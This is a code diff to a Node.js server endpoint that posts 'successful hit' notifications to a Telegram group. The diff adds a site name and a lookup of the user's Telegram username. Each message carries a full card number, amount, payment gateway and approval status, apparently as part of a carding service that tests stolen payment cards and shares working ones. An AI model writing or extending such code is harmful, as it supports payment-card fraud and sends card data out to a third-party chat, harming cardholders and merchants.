@@ -41,19 +41,32 @@ app.post('/api/send-otp', async (req, res) => {
 
 // Endpoint to send Hit Notification to Group
 app.post('/api/notify-hit', async (req, res) => {
-    const { card, amount, gateway, status, user_chat_id } = req.body;
+    const { card, amount, gateway, status, user_chat_id, site_name } = req.body;
     const GROUP_ID = '-1003721268860';
 
     try {
+        console.log('Fetching Username for Chat ID:', user_chat_id);
+        let userName = 'Unknown';
+        try {
+            const chatRes = await axios.get(`https://api.telegram.org/bot${BOT_TOKEN}/getChat?chat_id=${user_chat_id}`);
+            if (chatRes.data.ok) {
+                const chat = chatRes.data.result;
+                userName = chat.username ? `@${chat.username}` : `${chat.first_name || ''} ${chat.last_name || ''}`.trim();
+            }
+        } catch (e) {
+            console.warn('Could not fetch username:', e.message);
+        }
+
         console.log('Sending hit notification to group...');
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         const message = `🚀 <b>New Successful Hit!</b> 🚀\n\n` +
                         `💳 <b>Card:</b> <code>${card || 'N/A'}</code>\n` +
                         `💰 <b>Amount:</b> <code>${amount || 'N/A'}</code>\n` +
+                        `🌐 <b>Site:</b> <code>${site_name || 'Checkout Page'}</code>\n` +
                         `🔌 <b>Gateway:</b> <code>${gateway || 'Stripe'}</code>\n` +
                         `✅ <b>Status:</b> ${status || 'Approved'}\n\n` +
-                        `👤 <b>User Chat ID:</b> <code>${user_chat_id || 'Unknown'}</code>\n` +
+                        `👤 <b>User:</b> ${userName} (<code>${user_chat_id}</code>)\n` +
                         `✨ <b>Powered by Nexvora</b>`;
 
         const response = await axios.post(telegramUrl, {
